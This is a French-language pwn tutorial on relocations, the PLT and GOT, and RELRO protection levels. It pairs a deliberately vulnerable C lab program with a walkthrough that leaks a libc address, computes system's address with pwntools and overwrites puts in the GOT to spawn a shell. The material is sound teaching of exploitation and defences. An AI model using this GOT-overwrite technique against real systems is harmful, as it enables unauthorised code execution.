---
title: Partie 14 - Comprendre les mécanismes de protection mémoire - RELRO
date: 2026-04-25 10:00:00
categories: [Pwn, Introduction au pwn]
tags: [x86, pwn, linux]     # TAG names should always be lowercase
author: kabeche
toc: true
---

# Comprendre les mécanismes de protection mémoire : RELRO

![](/assets/images/introduction_au_pwn/relro.png)

**RELRO** aka "**RELocation Read-Only**" (ou Relocalisation en lecture seule 🥖) est une **protection** qu'il est important de connaître car son absence facilite grandement l'exploitation d'un programme, notamment lorsque l'on dispose d'une **primitive d'écriture arbitraire**. Inversement, sa présence nous met des bâtons dans les roues 🤕.

> Avant de nous parler de la protection, faudrait ptet' que tu nous parles de ce que sont les **relocalisations** non?
{: .prompt-info }

Zé partiii.

## 📍 Les relocalisations

### Gestion statique ou dynamique des fonctions

Commençons par le commencement. Un programme peut être compilé de **deux manières** :

- **statiquement** : la libc (ou autre librairie utilisée) sera incluse dans le programme compilé ;
- **dynamiquement** : les librairies utilisées ne seront chargées qu'au lancement du programme.

Dans le premier cas, pour les programmes compilés **statiquement**, la **libc** est **en partie incluse** dans le programme. Cela génère un programme **plus gros** mais les appels de fonctions se font comme si la fonction de la librairie (ex : `printf`, `malloc`...) était présente dans le code source lors de la compilation.

En revanche, lorsque le programme est compilé **dynamiquement**, les fonctions des librairies utilisées ne sont pas présentes dans le programme. Il est donc nécessaire d'avoir **un mécanisme permettant d'appeler les fonctions** tierces utilisées. Celui qui permet de réaliser un tel mécanisme, vous le connaissez, c'est `ld` !

Les **relocalisations** vont donc permettre au programme de savoir où sont situées les différentes **variables globales** et **fonctions externes**.

### Chargement dynamique des fonctions

Par défaut, `gcc` compile **dynamiquement** le programme C donné en entrée. Pour comprendre comment fonctionne les *relocations*, utilisons le programme suivant :

```cpp
#include <stdio.h>  
#include <stdlib.h>

int main()
{
	void *tmp = malloc(0x100);
	puts("Hello, World !");
	
	exit(0);
	return 0;
}
```

Accès au conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-relro-exemple-1.zip](https://drive.proton.me/urls/A0N3W35QJ0#vHRA84ZABISF)
- 🔎 **SHA256 & Analyse Virus Total** : [38810e4d2332b9f632003dc998df83633eb78a18e3d5ce13e8ec58c150b5f967](https://www.virustotal.com/gui/file/38810e4d2332b9f632003dc998df83633eb78a18e3d5ce13e8ec58c150b5f967)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-relro-exemple-1 .

docker run -it --rm -p 1234:1234 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-relro-exemple-1
```

Nous le compilerons de différentes manières afin de voir les spécificités des protections liées aux relocalisations. Compilons-le tout d'abord sans spécifier de paramètre quant aux relocalisations : `gcc -g -no-pie -fno-pie  main.c -o exe`.

> PIE est désactivé afin de faciliter le débogage et l'explication des relocalisations.
{: .prompt-tip }

Ouvrons le programme dans `gdb` et mettons un point d'arrêt sur `main`. Une fois arrivé sur le point d'arrêt, utilisons la commande `got` via `gdb-gef++`:

![](/assets/images/introduction_au_pwn/gdb_plt_got.png)

> Si vous déboguez le programme à distance, utilisez plutôt `gdb-pwndbg` avec la commande `got` plutôt que `gdb-gef++` qui galère à lancer `got` à distance.
{: .prompt-tip }

Ce qui nous intéresse particulièrement, ce sont les **trois dernières lignes**. Nous y voyons les **3 fonctions** de la **libc** que notre programme utilise. Intéressons-nous pour l'instant au contenu des deux colonnes :

- `GOT` : il s'agit du **pointeur vers la fonction** de la libc. Le pointeur est situé **dans le programme** ;
- `GOT value` : **contenu du pointeur**. Cela devrait, normalement, être une adresse de la libc.

La **GOT** (*Global Offset Table*) est une zone mémoire située **dans le programme** et qui contient **une table de pointeurs** vers des **variables globales** et **fonctions** situées dans des bibliothèques dynamiques. 

> Pour l'instant, faisons abstraction de la section **PLT**.
{: .prompt-tip } 

> Mais aucun des trois pointeurs ne pointe vers la **libc** ? Ils pointent tous vers une zone au **sein du programme** avec une adresse du type : `0x4010X0`.
{: .prompt-info }

Vous avez l’œil ! Vous n'avez pas tort, les pointeurs dans la **GOT** ne pointent pas vers `puts`, `malloc` ou `exit`, du moins, pas encore 😉. Mettons un point d'arrêt sur `call exit` et réutilisons la commande `got` une fois arrivés :

![](/assets/images/introduction_au_pwn/gdb_got_2.png)

Cette fois-ci les pointeurs de `puts` et `malloc`(situés dans la **GOT**) pointent bien vers les fonctions `puts` et `malloc` **dans la libc**. En revanche, le pointeur vers `exit` pointe toujours au sein du programme courant (`0x401050`).

On devine aisément ce qui s'est passé : comme `puts`et `malloc` ont été appelées, mais pas encore `exit`, seuls les **deux premiers pointeurs** ont été mis à jour.

Nous avons donc une réponse à la première question "où sont stockées les informations liées aux fonctions externes appelées ?". Mais une seconde question reste en suspens : **comment ces pointeurs sont utilisés** ? 

## De l'instruction d'appel à la fonction

Avant de nous jeter directement dans les méandres de **l'appel des fonctions chargées dynamiquement**, voyons comment cela est réalisé **d'un point de vue macro**, par exemple, lorsque `malloc(0x100)`est appelée depuis `main`:

![](/assets/images/introduction_au_pwn/plt_got_ld_bis.png)

Ce n'est pas le meilleur schéma du monde, mais j'espère qu'il fera l'affaire 😅. Notre objectif va être de comprendre ce qui se passe depuis l'appel de la fonction `malloc`dans la fonction `main` jusqu'à son exécution effective dans la **libc**.

Tout d'abord, distinguons deux cas :

- numéros en 🟢 : la fonction a déjà été appelée une fois : son symbole est déjà résolu ;
- numéros en 🔴 : elle n'a pas encore été appelée.

Commençons par le premier cas qui est le plus simple.

### 🟢 Appel d'une fonction dont le symbole a déjà été résolu

1️⃣ : la fonction `malloc`est appelée depuis `main`. Enfin, ce n'est pas réellement la fonction `malloc`qui est appelée mais `malloc@plt`. Il s'agit d'une **toute petite fonction** située dans la **PLT** (*Procedure Linkage Table*) qui est également une zone mémoire présente au sein du programme. Son rôle est d’agir comme un **intermédiaire** entre l’appel d’une fonction externe et son **exécution réelle**, en assurant le **branchement** vers son adresse effective lors de l’exécution.

Dans IDA cela ressemble à :

![](/assets/images/introduction_au_pwn/malloc_plt.png)

2️⃣ : ce petit bout de code est exécuté. 3️⃣ : il ne fait que sauter dans le contenu du pointeur de `malloc`situé dans la GOT :

![](/assets/images/introduction_au_pwn/malloc_got.png)

Vous remarquerez la principale différence entre la PLT et la GOT : 

- la **PLT** est une **zone mémoire de code** en **lecture seule** ;
- la **GOT** est une zone mémoire en **lecture** et **écriture modifiable** (mais pas toujours 🙃).

4️⃣ : comme nous sommes dans l'hypothèse que la résolution de la fonction `malloc`est déjà réalisée, le contenu de `malloc@got` (à l'adresse `0x404008`) est l'adresse réelle de `malloc`dans la **libc** :

![](/assets/images/introduction_au_pwn/malloc_got_libc.png)

5️⃣ : de ce fait, l'instruction `jmp 0x404008`, située dans la PLT, saute directement dans la fonction `malloc`dans la **libc**.

### 🔴 Appel d'une fonction dont le symbole n'est pas résolu

1️⃣, 2️⃣ et 3️⃣ : ces trois premières étapes sont **identiques dans les deux cas**.

4️⃣ : cette fois-ci le contenu du pointeur de `malloc`dans la GOT n'est pas l'adresse de la libc mais l'adresse suivante :

![](/assets/images/introduction_au_pwn/malloc_got_plt.png)

5️⃣ : le bout de code à cette adresse, situé dans la **PLT**, est le suivant :

![](/assets/images/introduction_au_pwn/ret_to_plt.png)

En fin de compte, lorsque le symbole d'une fonction n'a pas encore été résolu, le programme **retourne dans la PLT**. Et c'est là que tout le travail de **résolution** du symbole doit être fait. 

6️⃣ : le programme saute à l'adresse `0x401020` puis saute dans la fonction `_dl_runtime_resolve_xsave` situé dans **ld** !

> C'est quoi les différents `push` ?
{: .prompt-info }

J'ai volontairement choisi d'omettre quelques détails car nous n'allons pas voir, dans ce cours comment fonctionnent précisément la **PLT** et la **résolution de symboles**. A notre stade, faisons comme si cela était aussi simple que ces étapes : `ld` trouve l'adresse de `malloc`, le programme **l'écrit** ensuite **dans le pointeur** `malloc@got`et saute dans le corps de la fonction (dans la **libc**) 7️⃣.

## Exploiter les relocalisations (la GOT quoi)

Dans **gdb**, nous pouvons voir dans quelle zone mémoire est située la **GOT** :

![](/assets/images/introduction_au_pwn/partial_relro_gdb.png)

Comme vous pouvez le constater, cette zone mémoire est en lecture **et écriture** 😏. En ayant une **primitive d'écriture arbitraire**, il serait possible de modifier une entrée de la **GOT** afin de **rediriger l'exécution** du pointeur de fonction corrompu vers un **bout de code** (exemple : pour faire du [ROP](/posts/introduction_au_pwn_partie_20/)) ou une **fonction** intéressante (exemple : `system`, `execve` ...). 

## La protection RELRO

Cette protection a trois niveaux d'implémentation :

| Niveau d'implémentation     | Options de compilation | Protections mémoire de la GOT                | Résolution des entrées de la GOT                                                                      | Commentaire                                                                                                                                                                            | Exploitable ? |
| --------------------------- | ---------------------- | -------------------------------------------- | ----------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------- |
| Inexistante                 | `-Wl,-z,norelro`       | 📝 accessible en **lecture** et **écriture** | **Lazy binding** : au moment où la fonction est appelée                                               | Aucune protection n'est ajoutée                                                                                                                                                        | ✅             |
| Partielle (*partial RELRO*) | `-Wl,-z,relro`         | 📝 accessible en **lecture** et **écriture** | **Lazy binding** : au moment où la fonction est appelée                                               | Seules les **premières entrées** sont en **lecture seule**. <br><br>La **GOT** est également placée avant `.bss`(et `.data`?) pour éviter qu'un dépassement de `buffer`ne la corrompe. | ✅             |
| Totale (*full RELRO*)       | `-Wl,-z,relro,-z,now`  | 📄 accessible en **lecture seule**           | **Eager binding** : toutes les adresses de fonctions externes sont résolues au lancement du programme | **Toute la GOT** est placée dans une zone mémoire en **lecture seule**.                                                                                                                | ❌             |

Ci-dessous, un exemple où le programme est compilé avec la protection **Full RELRO**. Nous observons que la GOT est située dans une zone mémoire en **lecture seule** et que toutes les adresses des fonctions externes **ont été résolues** :

![](/assets/images/introduction_au_pwn/full_relro_gdb.png)

Dans les deux premiers cas il est toujours possible d'exploiter la **GOT** en modifiant une des entrées avec une primitive d'écriture arbitraire. Dans le cas où la protection est **Full RELRO** il n'est plus possible de le faire.

En effet, toutes les **adresses des fonctions externes** seront **résolues au lancement** du programme et, de toute manière, toute la **GOT** se trouve dans une zone mémoire en **lecture seule**.

## Exemple

Voyons comment exploiter un programme depuis la GOT via une primitive d'écriture arbitraire avec le programme suivant :

```cpp
#include <stdio.h>
#include <stdlib.h>

// gcc -no-pie -fno-pie main.c -o exe

int main(int argc, char **argv) 
{
    if (argc != 2)
    {
        printf("Pas assez d'arguments !\n");
        exit(-1);
    }

    unsigned long *got_addr = (unsigned long *)strtoul(argv[1],NULL,16);

    puts("Voici les 8 premieres entrees de la GOT :");
    for(int i=0; i<8; i++)
        printf("\t%p -> %p\n",&got_addr[i],got_addr[i]);

    puts("Quelle adresse souhaitez-vous modifier ?");
    unsigned long *addr;
    scanf("%lx",&addr);
    getchar();

    puts("Avec quelle valeur ?");
    unsigned long val;
    scanf("%lx",&val);
    getchar();
    
    *addr = val;
    puts("/bin/sh");
    printf("Alors, tu l'as eu ton shell ? ;-)\n");

    return 0;
}
```

Accès au conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-relro-exemple-2.zip](https://drive.proton.me/urls/PAX8EG0GFM#v8Z1fQP1TiBN)
- 🔎 **SHA256 & Analyse Virus Total** : [20e33e550613b65c40d39ee56e662bd02c81e2937357ba672a847488be5073a6](https://www.virustotal.com/gui/file/20e33e550613b65c40d39ee56e662bd02c81e2937357ba672a847488be5073a6)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-relro-exemple-2 .

docker run -it --rm -p 1234:1234 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-relro-exemple-2
```

Le programme prend en paramètre l'adresse de la GOT, **affiche les 8 premières entrées** et permet de **modifier le contenu d'une adresse**.

- 🎯 **Objectif** : réussir à ouvrir un *shell*;
- 🛡️ **Protection**: l'**ASLR** est à activer.

### Étapes intermédiaires

Nous allons faire face à **plusieurs problématiques**, voyons comment les résoudre une à une.

#### Trouver et afficher la GOT

Tout d'abord il va falloir que l'on trouve l'adresse de la **GOT**. Pour cela, il suffit de trouver où la section `.got.plt`va être chargée. *A priori*, elle sera chargée à une adresse connue d'avance car le programme **n'est pas PIE**.

Vous pouvez utiliser IDA en ouvrant l'onglet `Segments` :

![](/assets/images/introduction_au_pwn/ida_segments.png)

> Comment tu as su que c'était la section `.got.plt` qu'il faut utiliser et pas `.plt` ou `.got` par exemple ?
{: .prompt-info }

Alors, comment dire 😅. En fait, il y a plusieurs sections utilisées dans le cadre des relocalisations. Honnêtement je ne connais pas exactement les différences et les toutes leurs subtilités. Donc je préfère m'abstenir que de dire n'importe quoi ... Celle qui nous intéresse principalement en *pwn* est `.got.plt` car c'est elle qui contient les pointeurs vers les fonctions externes.

Quoi qu'il en soit, dans la section "**Aller plus loin**" ci-dessous, vous trouverez un lien qui détaille ces différentes sections pour les plus curieux 😉.  

Revenons à nos moutons 🐑. Nous pouvons également utiliser l'outil `readelf` qui est plus commode ici sachant que nous pourrons directement l'utiliser en **ligne de commandes** lors du lancement du programme :

```
$ readelf -a ./exe | grep ".got.plt"
  [24] .got.plt          PROGBITS         0000000000403fe8  00002fe8

$ ./exe $(readelf -a ./exe | grep ".got.plt" | head -n 1 | awk '{printf "0x%s", $4}')
Voici les 8 premieres entrees de la GOT :
	0x403fe8 -> 0x403e08
	0x403ff0 -> 0x744665e612e0
	0x403ff8 -> 0x744665e3d220
	0x404000 -> 0x744665c87be0
	0x404008 -> 0x401040
	0x404010 -> 0x744665c60100
	0x404018 -> 0x401060
	0x404020 -> 0x744665c57b20
Quelle adresse souhaitez-vous modifier ?
```

> Comment connaître la fonction listée à partir d'une de ces adresses ?
{: .prompt-info }

Un coup de `readelf -r ./exe` pour afficher les relocalisations et le tour est joué :

![](/assets/images/introduction_au_pwn/readelf_reloc.png)

### Trouver une adresse de la libc à partir d'un *leak*

Bon, pas besoin de faire tout un speech, on a compris que pour parvenir à ouvrir un *shell*, nous allons tenter d'exécuter `system` **à la place de** `puts`.

Le souci est que nous ne savons pas à quelle adresse est située `system`. Autant notre programme n'est pas PIE, autant la **libc**, elle, l'est à coup sûr. Ça tombe bien, nous allons apprendre par la même occasion **à trouver une adresse d'une fonction de la libc à partir d'un leak** (fuite mémoire).

Pour rappel, l'**ASLR** n'implique pas une **aléatoirisation totale** des adresses au sein d'un programme. Seules les octets de poids fort y sont soumis. Cela implique un **principe essentiel** : les fonctions d'un programme sont toutes situées à un *offset* fixe par rapport à **l'adresse de base** d'un programme.

> N'oubliez pas **d'activer l'ASLR** si ce n'est pas déjà fait 🙃.
{: .prompt-warning }

Nous n'allons pas revenir sur les détails de ce principe. Voyons comment nous pouvons **l'utiliser à notre avantage**.

En exécutant le programme plusieurs fois voici les différentes adresses utilisées pour la fonctions `puts`: 

```
1. 0x404000 -> 0x7bca86487be0
2. 0x404000 -> 0x71fe1e087be0
3. 0x404000 -> 0x7d7383887be0
4. 0x404000 -> 0x7b7cb0087be0 
```

On sent qu'il y a un *offset* caché dans ces différentes adresses. La question est : comment le déterminer ?

Il y a **deux cas** de figure :

1. nous **savons** quelle est la **libc** utilisée. En l'occurrence il s'agit de celle de notre machine que l'on peut trouver grâce à `ldd ./exe`. Sinon il est possible de trouver la **libc** en question sur internet et la télécharger ;
2. nous **ne savons pas** quelle est la **libc** utilisée par le programme (exemple : un programme/service à exploiter à distance).

Dans le **premier cas** il est possible d'avoir les *offsets* des différents symboles grâce à **pwntools** :

```python
from pwn import *
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
print("puts @ ",hex(libc.symbols["puts"]))
# Affiche : puts @  0x87be0
```

Dans le second cas, il existe une technique permettant de trouver la **version de la libc** utilisée mais cela nécessite de faire **fuiter quelques adresses** de fonctions. Ensuite, il suffit de spécifier l'adresse et le nom de la fonction dans un site / base de données comme :

- [libc.rip](https://libc.rip/) ;
- [https://libc.blukat.me/](https://libc.blukat.me/) ;
- et sûrement d'autres encore.

En utilisant l'adresse de `puts`et `printf` par exemple, la base de données réussit à trouver plusieurs potentielles **libc**. Plus on lui fournit d'adresses, plus le résultat est précis :

![](/assets/images/introduction_au_pwn/libc_db.png)

Une fois la **libc téléchargée**, nous nous retrouvons dans le cas n°1. Il est alors possible de récupérer les différents *offsets* grâce à *pwntools*.

Bon, poursuivons. Pour trouver l'adresse de `system`nous allons ouvrir **2 terminaux** :

- le **premier** permet d'exécuter le programme ;
- le **second**, de trouver l'adresse de `system`.

Dans **le premier**, utilisons `./exe $(readelf -a ./exe | grep ".got.plt" | head -n 1 | awk '{printf "0x%s", $4}')` afin d'afficher les premières entrées de la **GOT** :

```
Voici les 8 premieres entrees de la GOT :
	0x403fe8 -> 0x403e08                                                         
	0x403ff0 -> 0x7147be7e82e0                                                       0x403ff8 -> 0x7147be7c4220                                                       0x404000 -> 0x7147be487be0                                                       0x404008 -> 0x401040                                                             0x404010 -> 0x7147be460100                                                       0x404018 -> 0x401060                                                             0x404020 -> 0x7147be457b20                                                       
Quelle adresse souhaitez-vous modifier ?
```

Dans **le second**, trouvons l'adresse de `system` en deux temps :

1. trouver **l'adresse de base de la libc** à partir de **l'offset de** `puts`et de **l'adresse qui a fuité** ;
2. chemin inverse : trouver **l'adresse de** `system` à partir de **l'adresse de base de la libc** et de **l'offset de** `system`.

```python
from pwn import *

# Chemin a adapter
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

leak = 0x7147be487be0 # Recupere depuis le premier terminal
libc_base_addr = leak - libc.symbols["puts"]
print("libc_base_addr @ ",hex(libc_base_addr))

# Changement de l'adresse de base de la libc :
# 0x0000000000000000 -> 0x7147be400000
libc.address = libc_base_addr

system = libc.symbols["system"]
print("system @ ",hex(system))
# Exemple : system @  0x7147be458750
```

> **Astuce pwntools** : en **spécifiant une adresse de base** dans `libc.address`, `libc.symbols["xxxx"]` retourne **directement l'adresse de la fonction** en utilisant l'adresse de base fournie au lieu de simplement retourner l'*offset*.
{: .prompt-tip }

Enfin, nous pouvons modifier l'entrée de `puts` dans la **GOT** par l'adresse de `system` dans le premier terminal :

```
Quelle adresse souhaitez-vous modifier ?
0x404000
Avec quelle valeur ?
0x7147be458750
sh-5.2$ id
uid=1001(challenger) gid=1001(challenger) groups=1001(challenger)
```

Lorsque `call puts` a été exécutée ici :

```cpp
*addr = val;
puts("/bin/sh");
printf("Alors, tu l'as eu ton shell ? ;-)\n");
```

Son adresse dans la **GOT** pointant désormais vers `system`, cela a exécuté `system("/bin/sh")`. Comme exercice, vous pouvez bien évidemment vous amuser à faire tout ça dans un seul terminal avec un script Python via **pwntools**.

## Aller plus loin

![](/assets/images/introduction_au_pwn/got_plt_meme.png)

Si ce chapitre n'a pas étanché votre soif de curiosité au sujet des relocalisations, sachez que vous pouvez trouver différents articles, en anglais, pour aller plus loin :

- [GOT and PLT for pwning](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) : cet article met davantage l'accent sur la compréhension des sections `.got`, `.got.plt`etc. ;
- [sec15-paper-di-frederico.pdf](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf) : cet article technique détaille la mise en place de l'attaque **ret2dl_resolve** ;
- [Article du phrack](https://phrack.org/issues/58/4) : idem.

### ret2dl_resolve

Cette attaque consiste à invoquer une fonction de la **libc** (par exemple `system`) **sans disposer au préalable d’une fuite d’adresse**.

En effet, en tirant parti du **mécanisme de résolution dynamique** des symboles mis en œuvre par la **PLT** et `ld`, il est possible de **fabriquer des structures factices** (`.rel.plt`, `.dynsym`, `.dynstr`, etc.) afin d’amener le chargeur à **résoudre et exécuter une fonction arbitraire**.

## 📋 Synthèse

Au cours de ce chapitre, nous avons pu nous intéresser aux zones mémoire que sont la **PLT** et la **GOT** ainsi que leur différence : 

| Table   | Signification             | Type de zone | Contenu                                   | Modifiable ?               | Rôle                                                                       |
| ------- | ------------------------- | ------------ | ----------------------------------------- | -------------------------- | -------------------------------------------------------------------------- |
| **GOT** | *Global Offset Table*     | Données      | Pointeurs vers les **fonctions externes** | ✅ (si pas de *Full RELRO*) | Stocke les adresses effectives des fonctions de la **libc** (ou autre lib) |
| **PLT** | *Procedure Linkage Table* | Code         | Appels intermédiaires (jump, push)        | ❌                          | Intermédiaire entre **appel de fonction** et **libc** (ou autre lib)       |

Nous avons également abordé les notions suivantes :

- **RELRO** (_RELocation Read-Only_) protège la **GOT** des modifications ;
- sans protection appliquée, la **GOT** est **modifiable** : une **primitive d’écriture arbitraire** permet de détourner un appel (ex : remplacer `puts` par `system`) ;
- lorsqu’un programme est **compilé dynamiquement**, les adresses des fonctions externes sont **résolues** par le chargeur dynamique (`ld`) via la **PLT** et la **GOT** ;
- **trois niveaux de protection** existent :
    - ❌ **Aucune**  : la GOT **modifiable** ➕ résolution **paresseuse** ➡️ **exploitable**
    - ⚠️ **Partielle** (*Partial RELRO*) : GOT **toujours modifiable** ➕ seule une partie protégée ➡️ toujours **exploitable**
    - ✅ **Totale** (*Full RELRO*) : GOT en **lecture seule** ➕ résolution **immédiate** ➡️ **non exploitable**    
- L’attaque **ret2dl_resolve** exploite le fonctionnement de la résolution dynamique des fonctions en forgeant de **fausses structures** pour forcer `ld` à résoudre une **fonction arbitraire**.